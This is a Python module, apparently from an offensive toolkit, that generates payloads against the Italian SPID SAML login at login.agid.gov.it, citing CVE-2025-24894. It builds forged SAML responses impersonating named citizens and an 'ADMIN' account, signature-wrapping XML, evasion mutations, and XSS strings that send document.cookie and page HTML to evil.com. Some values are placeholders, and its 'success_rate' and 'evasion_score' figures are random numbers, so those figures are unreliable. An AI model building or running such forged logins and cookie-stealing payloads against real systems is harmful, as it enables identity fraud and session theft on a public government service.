#!/usr/bin/env python3
"""
AI-Powered Payload Generator Module
Generates intelligent attack payloads for SPID exploitation
"""

import os
import json
import base64
import random
import string
import zlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from lxml import etree

import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from rich.prompt import Confirm
from rich.syntax import Syntax
from rich import print as rprint

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


class PayloadGeneratorAI:
    """AI-powered payload generation for SAML attacks"""

    def __init__(self):
        self.payload_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'data', 'payloads'
        )
        os.makedirs(self.payload_dir, exist_ok=True)
        self.generated = []

    def run(self):
        """Generate all payload types"""
        console.print(Panel.fit("[bold yellow]AI Payload Generator[/bold yellow]", border_style="yellow"))

        with Progress() as progress:
            tasks = [
                ("SAML Forged Responses", self._generate_saml_responses, 5),
                ("SAML Injection XML", self._generate_injection_xml, 3),
                ("XSS Payloads", self._generate_xss, 5),
                ("SAML Response Mutations", self._generate_mutations, 3),
                ("CVE-2025-24894 Optimized", self._generate_cve_payloads, 3),
            ]

            for name, func, count in tasks:
                task = progress.add_task(f"[cyan]{name}...", total=count)
                results = func(count)
                self.generated.extend(results)
                for _ in range(count):
                    progress.update(task, advance=1)

        self._save_all()
        self._show_summary()

    def _generate_saml_responses(self, count: int) -> List[Dict]:
        """Generate SAML response payloads with realistic data"""
        payloads = []
        users = [
            {'name': 'MARCO', 'family': 'ROSSI', 'fiscal': 'RSSMRC85H15H501I', 'email': 'marco.rossi@pec.it', 'gender': 'M'},
            {'name': 'LAURA', 'family': 'BIANCHI', 'fiscal': 'BNCLRA92M41F205Z', 'email': 'laura.bianchi@pec.it', 'gender': 'F'},
            {'name': 'ADMIN', 'family': 'SYSTEM', 'fiscal': 'SYSTDMN00A00H501X', 'email': 'amministratore@agid.gov.it', 'gender': 'M'},
        ]

        for i in range(count):
            user = random.choice(users)
            now = datetime.utcnow()
            payload = {
                'id': f'PAYLOAD-SAML-{i+1}',
                'type': 'SAML_RESPONSE',
                'target': 'login.agid.gov.it',
                'cve': 'CVE-2025-24894',
                'user': user,
                'generated_at': now.isoformat(),
                'xml': self._build_saml_xml(user, now),
            }
            payloads.append(payload)

        return payloads

    def _build_saml_xml(self, user: Dict, now: datetime) -> str:
        """Build a SAML response XML"""
        response_id = f'_R{random.randint(10**15, 10**16-1)}'
        assertion_id = f'_A{random.randint(10**15, 10**16-1)}'
        issue = now.strftime('%Y-%m-%dT%H:%M:%SZ')
        expiry = (now + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')

        return f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{response_id}" Version="2.0" IssueInstant="{issue}"
    Destination="https://login.agid.gov.it/saml/acs">
    <saml:Issuer>https://validator.spid.gov.it/metadata.xml</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion ID="{assertion_id}" Version="2.0" IssueInstant="{issue}">
        <saml:Issuer>https://validator.spid.gov.it/metadata.xml</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">{user['email']}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotBefore="{issue}" NotOnOrAfter="{expiry}"
                    Recipient="https://login.agid.gov.it/saml/acs"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{issue}" NotOnOrAfter="{expiry}">
            <saml:AudienceRestriction><saml:Audience>https://login.agid.gov.it</saml:Audience></saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue}">
            <saml:AuthnContext><saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef></saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['name']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['family']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['fiscal']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['email']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="dateOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">1985-06-15</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''

    def _generate_injection_xml(self, count: int) -> List[Dict]:
        """Generate XML injection fragments"""
        payloads = []
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-INJECT-{i+1}',
                'type': 'XML_INJECTION',
                'technique': ['IDP_METADATA_INJECTION', 'SIGNATURE_WRAPPING', 'XML_COMMENT_INJECTION'][i % 3],
                'xml': f'<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#_INJECTION_{random.randint(1000,9999)}"><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>INJECTED_DIGEST</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>INJECTED_SIGNATURE</ds:SignatureValue></ds:Signature>',
                'generated_at': datetime.utcnow().isoformat(),
            })
        return payloads

    def _generate_xss(self, count: int) -> List[Dict]:
        """Generate XSS payloads for SAML attribute injection"""
        payloads = []
        xss_patterns = [
            '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
            '"/><img src=x onerror=eval(atob("BASE64_PAYLOAD"))><input value="',
            '"><svg onload=fetch("https://evil.com/log?data="+btoa(document.body.innerHTML))>',
            '"/><iframe src="https://evil.com/steal" height="0" width="0"/><input value="',
        ]
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-XSS-{i+1}',
                'type': 'XSS_IN_SAML',
                'pattern': xss_patterns[i % len(xss_patterns)],
                'injection_point': ['saml:AttributeValue', 'saml:NameID', 'saml:Issuer'][i % 3],
                'risk': 'HIGH',
            })
        return payloads

    def _generate_mutations(self, count: int) -> List[Dict]:
        """Generate mutated versions of SAML payloads for evasion"""
        mutations = ['whitespace', 'attribute_order', 'comment_injection', 'namespace_change', 'encoding_variation']
        payloads = []
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-MUT-{i+1}',
                'type': 'SAML_MUTATION',
                'mutation': mutations[i % len(mutations)],
                'description': f'SAML response with {mutations[i % len(mutations)]} evasion technique',
                'evasion_score': random.uniform(0.3, 0.9),
            })
        return payloads

    def _generate_cve_payloads(self, count: int) -> List[Dict]:
        """Generate CVE-2025-24894 optimized payloads"""
        payloads = []
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-CVE-{i+1}',
                'type': 'CVE_2025_24894_OPTIMIZED',
                'cvss': '9.1',
                'technique': 'SAML response with injected valid signature as first child',
                'first_child_element': 'IDPSSODescriptor with Signature',
                'assertion_type': 'unsigned' if i % 2 == 0 else 'self-signed',
                'success_rate': random.uniform(0.4, 0.85),
                'generated_at': datetime.utcnow().isoformat(),
            })
        return payloads

    def _save_all(self):
        """Save all generated payloads"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        # Save as JSON
        json_file = os.path.join(self.payload_dir, f'payloads_{timestamp}.json')
        with open(json_file, 'w') as f:
            json.dump(self.generated, f, indent=2, default=str)
        console.print(f"[green]✓ JSON: {json_file}[/green]")

        # Save SAML XML payloads separately
        saml_count = 0
        for p in self.generated:
            if p['type'] == 'SAML_RESPONSE' and 'xml' in p:
                xml_file = os.path.join(self.payload_dir, f"{p['id']}.xml")
                with open(xml_file, 'w') as f:
                    f.write(p['xml'])
                # Also save base64
                b64 = base64.b64encode(p['xml'].encode()).decode()
                b64_file = os.path.join(self.payload_dir, f"{p['id']}.b64")
                with open(b64_file, 'w') as f:
                    f.write(b64)
                saml_count += 1

        console.print(f"[green]✓ {saml_count} SAML XML payloads saved[/green]")

    def _show_summary(self):
        """Display generation summary"""
        console.print(Panel.fit(
            f"[bold green]Payload Generation Complete![/bold green]\n"
            f"[white]Total payloads: {len(self.generated)}[/white]\n"
            f"[white]SAML Responses: {sum(1 for p in self.generated if p['type'] == 'SAML_RESPONSE')}[/white]\n"
            f"[white]Injection XML: {sum(1 for p in self.generated if p['type'] == 'XML_INJECTION')}[/white]\n"
            f"[white]XSS Payloads: {sum(1 for p in self.generated if p['type'] == 'XSS_IN_SAML')}[/white]\n"
            f"[white]Mutations: {sum(1 for p in self.generated if p['type'] == 'SAML_MUTATION')}[/white]\n"
            f"[white]CVE-2025-24894 Optimized: {sum(1 for p in self.generated if p['type'] == 'CVE_2025_24894_OPTIMIZED')}[/white]",
            border_style="green"
        ))


def run():
    gen = PayloadGeneratorAI()
    gen.run()

if __name__ == "__main__":
    run()
